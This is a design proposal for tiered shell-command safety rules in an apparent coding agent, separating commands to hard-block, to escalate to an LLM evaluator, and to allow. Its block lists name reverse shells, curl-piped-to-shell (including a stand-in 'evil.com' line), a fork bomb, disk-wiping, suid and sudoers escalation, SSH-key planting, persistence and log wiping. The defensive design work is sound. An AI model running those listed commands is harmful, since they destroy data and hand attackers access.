# Shell heuristic redesign — proposal

The honest test for "genuinely dangerous" is: **could a competent dev plausibly type this on purpose during normal work?** If yes → not dangerous, just risky and the LLM evaluator should judge intent. If no → block hard, no exceptions.

## Tier S — Genuinely dangerous, no legitimate dev workflow

Hard block. No false positives.

1. **Disk-wiping primitives.**
   - `dd` with `of=/dev/sd*`, `of=/dev/nvme*`, `of=/dev/disk*`, `of=/dev/hd*`
   - `mkfs.*` against `/dev/sd*`, `/dev/nvme*`, etc.
   - `wipefs`, `shred /dev/*`, `blkdiscard /dev/*`
   - **Why no false positive:** nobody types this in a coding session by accident. People who format disks know what they're doing.

2. **Destroy-the-system removes.**
   - `rm -rf /`, `rm -rf /*`, `rm -rf ~/*` outside a known throwaway dir
   - `rm -rf /usr`, `/etc`, `/var`, `/boot`, `/lib`, `/lib64`, `/sbin`, `/bin`, `/home` (not `~/`), `/opt`, `/sys`, `/proc`, `/dev`
   - `rm -rf $VAR` where `$VAR` is undefined — the classic "expanded to empty string then `/`" footgun
   - `rm -rf "$HOME"` literal — almost certainly a typo or attack
   - **Why no false positive:** removing `/` or system dirs is never a legitimate dev op.

3. **Fork bombs.**
   - `:(){:|:&};:` and variants
   - **Why no false positive:** zero legitimate use.

4. **Curl/wget piped directly into a shell from the internet.**
   - `curl ... | sh`, `curl ... | bash`, `wget -qO- ... | sh`, `wget ... | python`
   - The canonical "trust me, run my script" pattern.
   - **Why no false positive:** even when "legitimate" (Rust install, brew install) it's bad practice. The agent should download, then run separately.

5. **Reverse shells.**
   - `bash -i >& /dev/tcp/...`
   - `nc -e /bin/sh ...`
   - `mkfifo ... | nc ... | sh ...`
   - `python -c 'import socket,subprocess'...`
   - **Why no false positive:** reverse shells have exactly one purpose.

6. **Privilege escalation primitives in the command itself.**
   - `chmod +s /bin/bash`, `chmod 4755` on a shell or interpreter
   - `setcap cap_setuid+ep ...` on a normal binary
   - `usermod -aG sudo ...`, `passwd ...`, `passwd root`
   - `echo ... >> /etc/sudoers`, `visudo` modifications via redirect
   - **Why no false positive:** post-exploitation patterns. A coding agent should never have a reason to make any binary suid root.

7. **Boot/init persistence.**
   - Writes to `/etc/cron.d/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/crontab`, `/var/spool/cron/*`
   - Writes to `/etc/systemd/system/*.service`, `systemctl enable` of arbitrary units the agent created
   - Writes to `/etc/init.d/*`, `/etc/rc.local`, `~/.config/autostart/*`
   - Writes to `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile` — borderline; possibly Tier A if appending a `PATH` export the user asked for, but writing arbitrary code is the standard persistence vector
   - **Why no false positive (mostly):** persistence is an attack pattern. Legitimate cron should go through the agent's `schedule` tool.

8. **SSH key planting / authorized_keys writes.**
   - Any write to `~/.ssh/authorized_keys`, `/root/.ssh/authorized_keys`
   - Any write to `~/.ssh/config` that adds `ProxyCommand` or `LocalCommand`
   - **Why no false positive:** SSH access is set up manually with `ssh-copy-id`, not via an agent.

9. **Kernel/firmware/bootloader writes.**
   - `/boot/*`, `/efi/*`, `/sys/firmware/*`
   - Writes to `/dev/mem`, `/dev/kmem`
   - `kexec`, `insmod`, `modprobe` of arbitrary modules
   - **Why no false positive:** zero coding-agent reason to touch these.

10. **History/log tampering.**
    - `> ~/.bash_history`, `unset HISTFILE`, `export HISTFILE=/dev/null`, `history -c`
    - `truncate -s 0 /var/log/*`, writes to `/var/log/*`, `>/var/log/auth.log`
    - **Why no false positive:** the only reason to wipe history is to hide what you did.

## Tier A — Risky but context-dependent (escalate to Tier 2, do NOT hard-block)

These look scary but a competent dev does them every day. The LLM evaluator with conversation context judges.

- **`rm -rf` inside a known workspace path** — `rm -rf node_modules`, `rm -rf dist`, `rm -rf .next`, `rm -rf build/`, `rm -rf target/`. **Daily ops.**
- **`&&` and `;` chains in general** — `cd foo && npm install`, `mkdir -p backend && mv main.go backend/ && cd backend`. **Constant.** This is the current bug.
- **`mv` over existing files** — clobber risk, not destruction.
- **Recursive chmod / chown within the workspace** — `chmod -R 755 ./scripts/`. Fine.
- **`find ... -delete` within the workspace** — fine. Outside it — escalate.
- **`tar`, `zip`, `unzip` over existing files** — clobber risk only.
- **`git clean -fdx`, `git reset --hard`, `git checkout -- .`** — destructive to uncommitted work but the standard dev recovery toolkit.
- **`docker rm`, `docker volume rm`, `docker system prune`** — destructive but routine cleanup.
- **`kill -9`, `pkill`, `killall`** — fine for stopping a stuck dev process.
- **Network requests in general** (`curl`, `wget`, `git clone`) — fine, the most common dev op. The dangerous variant is the `| sh` ending.
- **Writes to `~/.bashrc` etc.** — borderline. Should escalate, not hard block.
- **`sudo` anything** — sudo itself isn't dangerous; the *what* matters. Should escalate based on what's being sudo'd.

## Tier B — Looks scary, basically harmless

These are in the current rule list and are almost certainly false positives. **Drop entirely.**

- **`eval` / `exec` in shell** — used legitimately constantly (`eval "$(direnv hook bash)"`, `exec "$@"` in entrypoints).
- **Backticks `` `cmd` ``** — legitimate command substitution everywhere.
- **`$(...)` subshell** — completely standard. Blocking this is blocking modern shell.
- **Heredocs `<<EOF`** — used for everything from generating config files to multi-line SQL.
- **Process substitution `<(cmd)`** — diff'ing two streams, etc. Power-user but legitimate.
- **`ssh user@host`** — SSH is dev infrastructure. The dangerous bits are *what command* runs over SSH.
- **`crontab`** — current rule blocks this entirely. Should escalate, not block.
- **`base64`** — needed all the time for keys, secrets, image embedding. The dangerous variant is `base64 -d | sh`.
- **`nc`/netcat** — debugging tool. The dangerous variant is `nc -e`.
- **`kill -SIGNAL`** — basic process management.

## Proposed structural changes

Two changes to the heuristic system, both small:

1. **Hard block (`VerdictBlock`)** stays for Tier S patterns. New, focused regex set, ~12 rules. Each one has a clear "this has no legitimate use" justification.

2. **Escalate (`VerdictEscalate`)** for Tier A patterns. New severity tier, or per-rule `escalate: true` flag. Tier 2 LLM evaluator gets the action with the conversation context and judges. Escalation path needs a new return value from the heuristic — currently it's binary block/allow.

3. **Drop entirely** the Tier B rules. Backticks, `$(...)`, plain `eval`/`exec`, plain `crontab`, plain `ssh`, plain `nc`, plain `base64`, plain `kill -SIG`. The dangerous *combinations* of these (`base64 ... | sh`, `nc -e`) stay as hard blocks under their own rules.

The result: the agent can do `cd foo && npm install`, `rm -rf node_modules`, `mv main.go backend/ && mv go.mod backend/` without thinking. It cannot do `rm -rf /`, `dd of=/dev/sda`, or `curl evil.com | sh`. It has to ask the LLM evaluator about anything in between — the whole point of Tier 2.

## Open questions

1. **Workspace boundary as a discriminator.** The cleanest version of "rm -rf is fine inside the workspace, not outside" requires the heuristic to know the workspace path. It doesn't currently — heuristics are pure regex on the command string. Plumbing the workspace path into the heuristic engine is ~20 lines but changes the rule signature.

2. **Sudo policy.** Should `sudo anything` be (a) hard blocked, (b) always escalated, or (c) allowed if the underlying command is allowed? Default instinct: **(b) always escalate** — sudo elevates blast radius, the LLM should always get to think about it. Different threat model on a passwordless-sudo machine.
